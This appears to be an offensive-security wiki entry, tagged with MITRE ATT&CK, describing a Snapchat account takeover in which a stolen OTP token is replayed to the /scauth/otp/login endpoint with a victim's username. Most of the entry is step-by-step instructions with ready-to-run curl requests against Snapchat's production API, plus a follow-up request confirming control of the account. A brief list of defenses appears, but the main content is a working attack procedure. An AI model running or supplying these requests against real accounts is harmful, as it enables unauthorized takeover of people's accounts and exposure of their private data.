---
id: proc-snapchat-otp-login-001
name: Login-as-Victim-with-OTP
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.348Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - account-takeover
  - otp-login
platforms:
  - Web
  - Mobile (Android)
commands:
  - '[[commands/snapchat-otp-login-exploit]]'
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---

# Login-as-Victim-with-OTP

## Summary

This procedure completes the account takeover by submitting the illicitly obtained OTP token along with the victim's username to the /scauth/otp/login endpoint, authenticating as the victim and gaining full access.

## Description

With the OTP token from the logout exploit, craft a form-encoded POST to the login endpoint using the attacker's session headers but victim's details. The server accepts the token without further validation, logging in the attacker as the victim. Target: Snapchat OTP login flow. Prerequisites: OTP token, victim username, session headers. Expected outcome: Successful login response with victim's account details.

## Requirements

1. OTP token from logout exploit (must be fresh)
2. Victim's username
3. Attacker session headers and device parameters
4. Burp Suite for request construction

## Defense

Defensive measures and detection strategies:

- Bind OTP generation to specific sessions/devices
- Detect login from mismatched IPs or devices
- Alert on OTP usage shortly after generation without corresponding logout

## Objectives

1. Authenticate as the victim using stolen OTP
2. Access victim's account data and features
3. Confirm full takeover

## Instructions

### Step 1: Construct Login Request

**Context**: Build the form data with OTP and victim username, using intercepted session params.

**Command** ([[commands/snapchat-otp-login-exploit]]):
```bash
curl -X POST 'https://gcp.api.snapchat.com/scauth/otp/login' -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' -H 'X-Snapchat-Client-Auth: [attacker_token]' -H 'X-Snapchat-UUID: [uuid]' -H 'User-Agent: Snapchat/10.78.1.0 [device]' -H 'Accept: application/json' -H 'Accept-Language: en-GB;q=1, en;q=0.9' -H 'Accept-Encoding: gzip, deflate' --data 'application_id=com.snap.framework&attestation=[attestation]&device_id=[device_id]&dsig=[dsig]&dtoken1i=[dtoken]&fidelius_client_init=[fidelius]&height=1920&max_video_height=1920&max_video_width=1080&password=[redacted]&reactivation_confirmed=false&req_token=[req_token]&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=[current_ms]&token=[otp_token]&username=[victim_username]&width=1080'
```

> Expected output: {"updates_response":{"logged":true,"username":"[victim_username]","user_id":"[victim_user_id]",...}}. The response includes victim's session tokens for further access.

### Step 2: Verify Takeover

**Context**: Use new session to access victim-specific data.

**Command** ([[curl-victim-verify]]):
```bash
curl -X GET 'https://gcp.api.snapchat.com/user/me' -H 'X-Snapchat-Client-Auth: [new_victim_token]'
```

> Expected output: Victim's profile details, confirming control.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/snapchat-otp-login-exploit]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- account-takeover
- otp-login
